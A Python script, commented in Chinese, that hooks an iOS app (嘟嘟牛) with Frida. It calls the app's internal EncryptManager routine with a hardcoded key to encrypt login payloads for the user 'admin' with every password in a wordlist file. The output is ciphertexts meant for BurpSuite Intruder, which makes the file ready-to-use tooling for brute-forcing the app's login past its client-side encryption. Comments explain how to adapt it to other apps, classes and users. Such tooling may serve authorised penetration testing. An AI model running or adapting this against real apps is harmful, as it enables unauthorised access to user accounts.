import frida
import sys

#JS代码中需要修改datajs中的明文（data）、类名（实例为EncryptManager）、方法（实例为- encrypt:encryptOrDecrypt:key:tag:）
#Python代码中需要修改APP名（实例为嘟嘟牛）、user名
#外部文件中同级目录下所需要遍历的明文密码字典（默认为word.txt）
jsCode = """
    function datajs(user,pass) {
        var data = `{
                  "username" : ${user},
                  "timeStamp" : "1677866149515",
                  "sign" : "C4A4DC35C1E19DED42A5046831771620",
                  "loginImei" : "iPhone93b63690d0e97612",
                  "userPwd" : ${pass},
                  "equtype" : "iOS"
        }`;

        var EncryptClass = ObjC.classes.EncryptManager.new();
        var encryptResult = EncryptClass['- encrypt:encryptOrDecrypt:key:tag:'].call(EncryptClass, data, 0, "65102933", 2);
        return encryptResult + "";
    };

    rpc.exports = {
        rpcfunc : datajs
    };
"""
# 定义需要批量加密的文本路径
encryptWord_file = 'word.txt'
# 读取文本中的所有行
with open(encryptWord_file, 'r') as Words:
    encryptWords = Words.read().splitlines()

# 连接设备，并将JavaScript代码注入进程
process = frida.get_usb_device().attach('嘟嘟牛')
script = process.create_script(jsCode)
script.load()
print("Link Strat!\n")

# 遍历用户名和密码字典，依次加密输出
with open('result.txt','w') as f:
    for word in encryptWords:
        # 调用RPC函数并打印结果
        result = script.exports.rpcfunc("admin", word)
        print(f"password: {word}, result: {result}")
        f.write(result + '\n')

print("\n调用结束，纯密文结果已同步同级目录下result.txt文件，下一步请将密文放置到BurpSuite的Intruder\n")
sys.stdin.read()





